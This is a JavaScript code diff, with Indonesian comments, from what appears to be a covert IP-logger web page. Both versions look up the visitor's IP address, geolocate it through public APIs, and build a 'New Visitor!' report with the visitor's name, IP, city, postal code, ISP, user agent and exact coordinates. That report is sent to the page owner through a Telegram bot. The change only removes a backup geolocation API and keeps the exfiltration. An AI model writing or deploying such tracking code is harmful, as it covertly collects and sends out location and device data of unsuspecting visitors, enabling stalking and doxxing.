@@ -43,56 +43,32 @@
                 let ipData = await ipResponse.json();
                 let userIP = ipData.ip;
 
-                // 2️⃣ Ambil informasi detail dari freeipapi.com
+                // 2️⃣ Ambil informasi detail tentang IP
                 let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
                 let locationData = await locationResponse.json();
 
-                // 3️⃣ Ambil informasi tambahan dari ip-api.com
-                let backupResponse = await fetch(`http://ip-api.com/json/${userIP}`);
-                let backupData = await backupResponse.json();
-
-                // 4️⃣ Gabungkan data dari kedua API
-                let finalData = {
-                    ip: locationData.ipAddress || backupData.query,
-                    negara: locationData.countryName || backupData.country,
-                    kodeNegara: locationData.countryCode || backupData.countryCode,
-                    kota: locationData.cityName || backupData.city,
-                    region: locationData.regionName || backupData.regionName,
-                    benua: locationData.continent || "Tidak diketahui",
-                    kodePos: locationData.zipCode || backupData.zip,
-                    zonaWaktu: locationData.timeZone || backupData.timezone,
-                    mataUang: locationData.currency?.name || "Tidak diketahui",
-                    kodeMataUang: locationData.currency?.code || "Tidak diketahui",
-                    bahasa: locationData.language || "Tidak diketahui",
-                    isp: locationData.ispName || backupData.isp || "Tidak diketahui",
-                    tld: locationData.tlds ? locationData.tlds.join(", ") : "Tidak diketahui",
-                    latitude: locationData.latitude || backupData.lat,
-                    longitude: locationData.longitude || backupData.lon,
-                    proxy: locationData.isProxy ? "Ya" : (backupData.proxy ? "Ya" : "Tidak")
-                };
-
-                // 5️⃣ Update iframe dengan koordinat pengguna
+                // 3️⃣ Update iframe dengan koordinat pengguna
                 let mapIframe = document.getElementById("map-frame");
-                mapIframe.src = `https://www.google.com/maps?q=${finalData.latitude},${finalData.longitude}&output=embed`;
+                mapIframe.src = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}&output=embed`;
 
-                // 6️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
+                // 4️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
                 let message = `🚨 *Pengunjung Baru!* 🚨\n\n` +
                               `👤 *Nama:* ${userName}\n` +
-                              `📍 *IP:* \`${finalData.ip}\`\n` +
-                              `🌍 *Negara:* ${finalData.negara} (${finalData.kodeNegara})\n` +
-                              `🏙 *Kota:* ${finalData.kota}, ${finalData.region}\n` +
-                              `🌎 *Benua:* ${finalData.benua}\n` +
-                              `📌 *Kode Pos:* ${finalData.kodePos}\n` +
-                              `🕒 *Zona Waktu:* ${finalData.zonaWaktu}\n` +
-                              `💱 *Mata Uang:* ${finalData.mataUang} (${finalData.kodeMataUang})\n` +
-                              `🗣 *Bahasa:* ${finalData.bahasa}\n` +
-                              `📡 *ISP:* ${finalData.isp}\n` +
-                              `🌐 *TLD:* ${finalData.tld}\n` +
+                              `📍 *IP:* \`${locationData.ipAddress}\`\n` +
+                              `🌍 *Negara:* ${locationData.countryName} (${locationData.countryCode})\n` +
+                              `🏙 *Kota:* ${locationData.cityName}, ${locationData.regionName}\n` +
+                              `🌎 *Benua:* ${locationData.continent} (${locationData.continentCode})\n` +
+                              `📌 *Kode Pos:* ${locationData.zipCode}\n` +
+                              `🕒 *Zona Waktu:* ${locationData.timeZone}\n` +
+                              `💱 *Mata Uang:* ${locationData.currency.name} (${locationData.currency.code})\n` +
+                              `🗣 *Bahasa:* ${locationData.language}\n` +
+                              `📡 *ISP:* ${locationData.ispName || "Tidak diketahui"}\n` +
+                              `🌐 *TLD:* ${locationData.tlds.join(", ")}\n` +
                               `🔍 *User-Agent:* \`${navigator.userAgent}\`\n\n` +
-                              `📌 *Koordinat:* ${finalData.latitude}, ${finalData.longitude}\n` +
-                              `🕹 *Proxy:* ${finalData.proxy}`;
+                              `📌 *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
+                              `🕹 *Proxy:* ${locationData.isProxy ? "Ya" : "Tidak"}`;
 
-                // 7️⃣ Kirim pesan ke Telegram
+                // 5️⃣ Kirim pesan ke Telegram
                 sendToTelegram(message);
 
             } catch (error) {
